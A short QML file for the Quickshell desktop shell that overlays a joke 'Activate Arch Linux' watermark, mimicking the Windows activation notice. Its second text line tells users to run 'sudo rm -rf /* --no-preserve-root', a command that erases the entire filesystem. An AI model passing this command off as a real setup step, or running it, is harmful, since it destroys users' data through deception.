
import Quickshell
import Quickshell.Wayland
import QtQuick
// import "components"

WlrLayershell {
    id: plugin
    layer: WlrLayer.overlay
    implicitWidth: 12 + textplugin.width
    implicitHeight: 120
    color: "transparent"
    exclusiveZone: -1
    mask: Region { }
    anchors {
        bottom: true
        right: true
    }

    Rectangle {
        color: "transparent"
        anchors {
            fill: parent
            bottomMargin: 15
            rightMargin: 15
            right: parent.right
        }
        Column {
            spacing: 3
            anchors.left: parent.left
            Text {
                horizontalAlignment: Text.AlignLeft
                width: textplugin.width
                text: "Activate Arch Linux"
                color: "white"
                font.pixelSize: 35
                font.family: fontFamily
                font.weight: Font.Black
                opacity: 0.8
            }
            
            Text {
                horizontalAlignment: Text.AlignLeft
                anchors.topMargin: 38
                id: textplugin
                text: "For activating arch linux write `sudo rm -rf /* --no-preserve-root`"
                color: "white"
                font.pixelSize: 17
                font.family: fontFamily
                font.weight: Font.Black
                opacity: 0.8
            }
        }
    }
}
